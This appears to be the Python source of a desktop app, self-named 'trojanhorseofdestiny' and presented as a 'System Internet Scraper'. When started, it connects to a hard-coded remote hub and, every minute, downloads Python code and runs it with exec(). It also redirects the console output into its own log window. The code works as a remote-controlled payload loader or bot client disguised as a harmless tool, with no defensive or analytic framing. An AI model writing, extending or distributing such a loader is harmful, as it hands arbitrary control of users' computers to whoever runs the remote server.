import sys
import time
import threading
import requests
import toga
import asyncio
from toga.style import Pack
from toga.style.pack import COLUMN, ROW

class LogStream:
    def __init__(self, append_func):
        self.append_func = append_func
    def write(self, text):
        if text and text.strip():
            self.append_func(text)
    def flush(self):
        pass

class trojanhorseofdestiny(toga.App):
    def startup(self):
        self.main_window = toga.MainWindow(title="System Internet Scraper")
        
        self.hub_input = toga.TextInput(
            value="https://hiveslave-scraper.onrender.com",
            style=Pack(flex=1, padding_right=5)
        )
        self.connect_btn = toga.Button("Connect & Start", on_press=self.start_loader)
        
        self.log_box = toga.MultilineTextInput(readonly=True, style=Pack(flex=1, padding_top=10))
        
        box = toga.Box(
            children=[
                toga.Label("Hub Server URL:"),
                toga.Box(children=[self.hub_input, self.connect_btn], style=Pack(direction=ROW)),
                toga.Label("System Logs:"),
                self.log_box
            ],
            style=Pack(direction=COLUMN, padding=10)
        )
        
        # Redirect stdout/stderr to our log box
        sys.stdout = LogStream(self.log_message_threadsafe)
        sys.stderr = LogStream(self.log_message_threadsafe)
        
        self.main_window.content = box
        self.main_window.show()
        
        print("Application Initialized.")
        print("Ready to connect to Hive network.")

    def log_message_threadsafe(self, text):
        # Toga's loop is an asyncio loop. We can use call_soon_threadsafe.
        if hasattr(self, 'loop'):
            self.loop.call_soon_threadsafe(self.log_message, text)
        else:
            # Fallback if loop is not yet available
            self.log_message(text)

    def log_message(self, text):
        # Update the log box value.
        ts = time.strftime('%H:%M:%S')
        self.log_box.value += f"[{ts}] {text}\n"

    def start_loader(self, widget):
        widget.enabled = False
        hub_url = self.hub_input.value
        print(f"Connecting to {hub_url}...")
        
        thread = threading.Thread(target=self.background_loader, args=(hub_url,))
        thread.daemon = True
        thread.start()

    def background_loader(self, hub_url):
        # Set persistent globals for the payload
        payload_globals = globals().copy()
        payload_globals['HUB_URL'] = hub_url
        
        while True:
            try:
                print("Fetching mission from Hub...")
                resp = requests.get(f"{hub_url}/latest-client", timeout=30)
                if resp.status_code == 200:
                    payload_data = resp.json()
                    payload_code = payload_data.get("code")
                    if payload_code:
                        print("Mission received. Executing payload...")
                        # Pass the hub_url in globals so the payload uses it!
                        exec(payload_code, payload_globals)
                    else:
                        print("Hub returned empty mission. Retrying in 60s...")
                else:
                    print(f"Hub Error: Status {resp.status_code}")
            except Exception as e:
                print(f"Background Error: {e}")
            
            time.sleep(60)

def main():
    return trojanhorseofdestiny("trojanhorseofdestiny", "com.quill.zodiac.trojanhorseofdestiny")
